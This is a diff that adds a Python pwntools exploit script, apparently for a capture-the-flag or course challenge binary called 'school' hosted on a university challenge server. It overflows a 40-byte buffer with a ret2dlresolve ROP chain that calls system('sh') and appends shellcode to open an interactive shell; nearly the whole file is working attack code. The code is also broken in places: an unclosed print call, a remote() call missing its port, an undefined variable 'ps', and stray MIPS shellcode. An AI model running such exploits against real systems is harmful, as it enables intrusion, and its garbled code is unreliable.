@@ -1,0 +1,38 @@
+#!/usr/bin/env python3
+
+import re
+import sys
+import struct
+import socket
+from pwn import *
+import socket
+from word2number import w2n
+
+binary = context.binary = ELF('./school')
+
+rop = ROP(binary)
+ret = rop.find_gadget(['ret'])[0]
+
+dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])
+
+shellcode = asm(shellcraft.mips.linux.sh())
+
+rop.raw(ret)
+rop.gets(dl.data_addr)
+rop.ret2dlresolve(dl)
+
+
+p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', )
+print(p.recvuntil(b'abc123): ')
+ps.sendline(b'netid\n')
+
+
+payload = b''
+payload += 0x28 * b'A'
+payload += rop.chain()
+payload += b'\n'
+payload += dl.payload
+payload += asm(shellcraft.sh())
+
+p.sendline(payload)
+p.interactive()
